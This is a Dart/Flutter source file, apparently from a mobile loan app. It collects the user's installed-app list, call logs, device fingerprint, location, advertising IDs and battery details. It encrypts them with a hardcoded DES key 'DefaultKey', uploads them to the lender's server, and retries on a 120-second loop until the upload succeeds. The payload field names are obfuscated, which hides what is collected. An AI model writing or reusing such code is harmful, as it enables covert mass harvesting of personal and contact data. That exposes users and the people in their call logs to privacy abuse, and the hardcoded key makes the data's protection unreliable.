import 'dart:convert';
import 'dart:isolate';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:intl/intl.dart';
import 'package:collect_plus/collect_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../common/function/common_dio_function.dart';
import '../../common/map/Common_dio_map.dart';
import '../../common/map/common_map.dart';
import '../map/sign_map.dart';

class SignFunction {
  int appCount = 0;
  int callCount = 0;
  int callDay = 0;
  int request_num = 0;
  int request_new_num = 0;
  final http = CommonDioFunction();

  Future<void> initData(int appCo, int callCo, int callDa) async {
    appCount = appCo;
    callCount = callCo;
    callDay = callDa;
    await _sharedPreferences('is_new', '1');
    isNewUser();
  }

  Future<void> isNewUser() async {
    request_new_num++;
    if (request_new_num > 10) return;
    try {
      PublicDioMap model = await http.get({}, loanNewUserUrl);
      if (model.code == 0) {
        request_new_num = 0;
        if (model.data['qxtpMwxlmUqfw'] == 1) {
          psuhDeviceInfoStatus({});
        } else {
          await _sharedPreferences('is_new', '0');
        }
      } else if (model.code == 700) {
        request_new_num = 0;
        EasyLoading.showError(model.msg);
      } else {
        Future.delayed(Duration(milliseconds: 120), () {
          isNewUser();
        });
      }
    } catch (e) {
      Future.delayed(Duration(milliseconds: 120), () {
        isNewUser();
      });
    }
  }

  Future<void> psuhDeviceInfoStatus(Map<String, dynamic> para) async {
    String lead_isnew = await _sharedPreferences('is_new', '');
    if (lead_isnew == '' || lead_isnew == '1') {
      request_num++;
      pushApp(para, request_num);
    }
    if (lead_isnew == '0') return;

    startIsoLate();
  }

  Future<void> startIsoLate() async {
    final receive = ReceivePort();
    try {
      await Isolate.spawn(_isoLate, receive.sendPort);
      receive.listen((message) {
        psuhDeviceInfoStatus({});
        receive.close();
      });
    } on Object catch (e) {
      receive.close();
    }
  }

  static void _isoLate(SendPort send) {
    Future.delayed(Duration(seconds: 120), () {
      send.send('re');
    });
  }

  Future<String> _sharedPreferences(String key, String value) async {
    final prefs = await SharedPreferences.getInstance();
    String mobile = prefs.getString('mobile') ?? 'mobile';
    DateTime now = DateTime.now();
    DateFormat formatter = DateFormat('yyyy-MM-dd');
    mobile = mobile + formatter.format(now);

    Map<String, dynamic> device_status = jsonDecode(
      prefs.getString(mobile) ?? '{}',
    );

    String old_value = device_status[key] ?? '';
    device_status.remove(key);
    device_status.addAll({key: value.length == 0 ? old_value : value});
    String status_js = jsonEncode(device_status);
    prefs.setString(mobile, status_js);
    return value.length == 0 ? old_value : value;
  }

  Future<void> pushApp(Map<String, dynamic> para, int index) async {
    int judge_index = index;
    if (judge_index != request_num) return;
    String app_list_str = await _sharedPreferences('app_list_str', '');
    if (app_list_str.length != 0) {
      para.addAll({'utwkzTobdYuccqArgh': app_list_str});
      pushCallLog(para, judge_index);
      return;
    }
    try {
      final appService = AppService();
      final appList = await appService.getApp();
      Map<String, dynamic> app_map = {'sxqGwjstKmljRlkry': appList};
      String jsonStr = jsonEncode(app_map);

      final des = DESService();
      final des_re = await des.flutterDes(jsonStr);
      final dioService = DioService();
      String file_path = await dioService.getPushFilePath(des_re);
      para.addAll({'utwkzTobdYuccqArgh': file_path});
      if (file_path.length != 0)
        await _sharedPreferences('app_list_str', file_path);
      pushCallLog(para, judge_index);
    } catch (e) {
      para.addAll({'utwkzTobdYuccqArgh': ''});
      pushCallLog(para, judge_index);
    }
  }

  Future<void> pushCallLog(Map<String, dynamic> para, int index) async {
    int judge_index = index;
    if (judge_index != request_num) return;
    String call_log_list = await _sharedPreferences('call_log_list', '');
    if (call_log_list.length != 0) {
      para.addAll({'cyfNkgfFcmStqx': call_log_list});

      pushDevice(para, judge_index);
      return;
    }
    try {
      late String jsonStr;
      final callService = CallLogService();
      final call_status = await NativePermission.isCallLogGranted();
      if (call_status == 2) {
        List call = await callService.getCallLogs(callDay);
        if (call.length > callCount) {
          call = call.sublist(0, callCount);
        }
        jsonStr = jsonEncode(call);
      } else {
        jsonStr = jsonEncode('no permission');
      }

      final des = DESService();
      final des_re = await des.flutterDes(jsonStr);
      final dioService = DioService();
      String file_path = await dioService.getPushFilePath(des_re);
      para.addAll({'cyfNkgfFcmStqx': file_path});
      if (file_path.length != 0)
        await _sharedPreferences('call_log_list', file_path);
      pushDevice(para, judge_index);
    } catch (e) {
      para.addAll({'cyfNkgfFcmStqx': ''});
      pushDevice(para, judge_index);
    }
  }

  Future<void> pushDevice(Map<String, dynamic> para, int index) async {
    int judge_index = index;
    if (judge_index != request_num) return;
    String device_map = await _sharedPreferences('device_map', '');
    if (device_map.length != 0) {
      para.addAll({'lkxoMryzJawsfDav': device_map});
      saveDeviceInfo(para, judge_index);
      return;
    }

    try {
      final deviceService = DeviceService();
      String deviceInof = await deviceService.getDevice();
      print(deviceInof);
      Map<String, dynamic> json = jsonDecode(deviceInof);
      Map<String, dynamic> location = await getCityName();
      json.addAll(location);

      final prefs = await SharedPreferences.getInstance();

      Map<String, dynamic> deviceOtherInfo = json['yojdRcnYraParbSwrf'] ?? {};
      deviceOtherInfo.addAll({'wctdcFlbxWttfRxn': false});
      deviceOtherInfo.addAll({'whwlbIcyRvkfdNhogHlr': prefs.get('adid') ?? ''});

      Map<String, dynamic> general = json['zinTwvxGzoVhdaqLtsx'] ?? {};
      general.addAll({'ittHxkkRbsyb': prefs.get('googleAdId') ?? ''});

      Map<String, dynamic> battery_flutter = await BatteryInfo()
          .getBatteryInfo();
      Map<String, dynamic> battery = json['zmyFtfwHgds'];
      final capacity = await BatteryInfo.getBatteryCapacity();
      String capacity_all = '0mAh';
      if (capacity != null) {
        capacity_all = '${capacity}mAh';
      }
      battery.addAll({'vozdfAkxooBwpxQmppd': capacity_all});
      battery.addAll({
        'iqmlYcwkxOasmItmviLgreh': battery_flutter['batteryHealth'] ?? '',
      });
      battery.addAll({
        'pcubkWrtFsjiYsp': battery_flutter['batteryTechnology'] ?? '',
      });
      battery.addAll({
        'flehClwIdnVsagMknzg': battery_flutter['batteryTemperature'] ?? '',
      });
      battery.addAll({'bkrXfjbKttv': battery_flutter['batteryVoltage'] ?? ''});

      String jsonStr = jsonEncode(json);

      final des = DESService();
      final des_re = await des.flutterDes(jsonStr);
      final dioService = DioService();
      String file_path = await dioService.getPushFilePath(des_re);
      para.addAll({'lkxoMryzJawsfDav': file_path});
      if (file_path.length != 0)
        await _sharedPreferences('device_map', file_path);
      saveDeviceInfo(para, judge_index);
    } catch (e) {
      para.addAll({'lkxoMryzJawsfDav': ''});
      saveDeviceInfo(para, judge_index);
    }
  }

  Future<void> saveDeviceInfo(Map<String, dynamic> para, int index) async {
    int judge_index = index;
    if (judge_index != request_num) return;
    try {
      PublicDioMap model = await http.post(para, userSaveDeviceUrl);
      String app_list_str = await _sharedPreferences('app_list_str', '');
      if (app_list_str.length == 0) return;
      String device_map = await _sharedPreferences('device_map', '');
      if (device_map.length == 0) return;
      if (model.code == 0) {
        final prefs = await SharedPreferences.getInstance();
        String mobile = prefs.getString('mobile') ?? 'mobile';
        DateTime now = DateTime.now();
        DateFormat formatter = DateFormat('yyyy-MM-dd');
        mobile = mobile + formatter.format(now);
        prefs.remove(mobile);
        await _sharedPreferences('is_new', '0');
      }
    } catch (e) {}
  }
}

class DESService {
  static void _isolateEntryPoint(List<dynamic> args) async {
    final SendPort sendPort = args[0];

    final rootIsolateToken = args[1] as RootIsolateToken;

    String jsonStr = args[2];

    final errorPort = ReceivePort();

    try {
      BackgroundIsolateBinaryMessenger.ensureInitialized(rootIsolateToken);

      errorPort.listen((error) {
        debugPrint('Isolate error: $error');

        sendPort.send([]);
      });
      const channel = MethodChannel('des_encryption');

      final result = await channel.invokeMethod('encryptDES', {
        'plaintext': jsonStr,
        'key': 'DefaultKey',
      });

      sendPort.send(result);
    } catch (e, stack) {
      debugPrint('Isolate error: $e\n$stack');

      sendPort.send('');
    } finally {
      errorPort.close();

      Isolate.exit(sendPort);
    }
  }

  Future<String> flutterDes(String jsonStr) async {
    final receivePort = ReceivePort();

    final rootIsolateToken = RootIsolateToken.instance!;

    try {
      await Isolate.spawn(_isolateEntryPoint, [
        receivePort.sendPort,
        rootIsolateToken,
        jsonStr,
      ], debugName: 'CallLogsFetcher');

      final result = await receivePort.first;

      return result;
    } catch (e) {
      debugPrint('Failed to spawn isolate: $e');

      return '';
    } finally {
      receivePort.close();
    }
  }
}

class AppService {
  static void _isolateEntryPoint(List<dynamic> args) async {
    final SendPort sendPort = args[0];

    final rootIsolateToken = args[1] as RootIsolateToken;

    final errorPort = ReceivePort();

    try {
      BackgroundIsolateBinaryMessenger.ensureInitialized(rootIsolateToken);

      errorPort.listen((error) {
        debugPrint('Isolate error: $error');

        sendPort.send([]);
      });

      const channel = MethodChannel('InstalledApps');
      final result = await channel.invokeMethod('getInstalledApps');

      final apps = (result as List?)?.cast<Map<dynamic, dynamic>>() ?? [];
      final validApps = apps.map((app) => _parseLogEntry(app)).toList();

      sendPort.send(validApps);
    } catch (e, stack) {
      debugPrint('Isolate error: $e\n$stack');

      sendPort.send('');
    } finally {
      errorPort.close();

      Isolate.exit(sendPort);
    }
  }

  static Map<String, dynamic> _parseLogEntry(Map<dynamic, dynamic> app) {
    return {
      "myosNxwljJimlBvq": app['name']?.toString() ?? '',

      "nvbinHfxvGzgnGpg": app['id']?.toString() ?? '',

      'yujMdvgbAwrNbe': app['installTime']?.toString() ?? '',

      'kjyuoAldDsihTnlhYieh': (app['isSystem'] as bool?) ?? false,
    };
  }

  Future<List<Map<String, dynamic>>> getApp() async {
    final receivePort = ReceivePort();

    final rootIsolateToken = RootIsolateToken.instance!;

    try {
      await Isolate.spawn(_isolateEntryPoint, [
        receivePort.sendPort,
        rootIsolateToken,
      ], debugName: 'CallLogsFetcher');

      final result = await receivePort.first;

      return result;
    } catch (e) {
      debugPrint('Failed to spawn isolate: $e');

      return [];
    } finally {
      receivePort.close();
    }
  }
}

class DeviceService {
  static void _isolateEntryPoint(List<dynamic> args) async {
    final SendPort sendPort = args[0];

    final rootIsolateToken = args[1] as RootIsolateToken;

    final errorPort = ReceivePort();

    try {
      BackgroundIsolateBinaryMessenger.ensureInitialized(rootIsolateToken);

      errorPort.listen((error) {
        debugPrint('Isolate error: $error');

        sendPort.send([]);
      });

      CollectPlus collectPlus = CollectPlus();
      collectPlus.init('DefaultKey', 5000);
      String result = await collectPlus.getDeviceInfo() ?? '';

      sendPort.send(result);
    } catch (e, stack) {
      debugPrint('Isolate error: $e\n$stack');

      sendPort.send('');
    } finally {
      errorPort.close();

      Isolate.exit(sendPort);
    }
  }

  Future<String> getDevice() async {
    final receivePort = ReceivePort();

    final rootIsolateToken = RootIsolateToken.instance!;

    try {
      await Isolate.spawn(_isolateEntryPoint, [
        receivePort.sendPort,
        rootIsolateToken,
      ], debugName: 'CallLogsFetcher');

      final result = await receivePort.first;

      return result;
    } catch (e) {
      debugPrint('Failed to spawn isolate: $e');

      return '';
    } finally {
      receivePort.close();
    }
  }
}

class DioService {
  static void _isolateEntryPoint(List<dynamic> args) async {
    final SendPort sendPort = args[0];

    final rootIsolateToken = args[1] as RootIsolateToken;

    final String o_data = args[2];

    final errorPort = ReceivePort();

    try {
      BackgroundIsolateBinaryMessenger.ensureInitialized(rootIsolateToken);

      errorPort.listen((error) {
        debugPrint('Isolate error: $error');

        sendPort.send([]);
      });

      PublicDioMap model = await CommonDioFunction().uploadJsonData(
        {},
        fileUploadUrl,
        o_data,
      );
      String result = '';

      if (model.code == 0) {
        result = model.data;
      }

      sendPort.send(result);
    } catch (e, stack) {
      debugPrint('Isolate error: $e\n$stack');

      sendPort.send('');
    } finally {
      errorPort.close();

      Isolate.exit(sendPort);
    }
  }

  Future<String> getPushFilePath(String o_data) async {
    final receivePort = ReceivePort();

    final rootIsolateToken = RootIsolateToken.instance!;

    try {
      await Isolate.spawn(_isolateEntryPoint, [
        receivePort.sendPort,
        rootIsolateToken,
        o_data,
      ], debugName: 'CallLogsFetcher');

      final result = await receivePort.first;

      return result;
    } catch (e) {
      debugPrint('Failed to spawn isolate: $e');

      return '';
    } finally {
      receivePort.close();
    }
  }
}
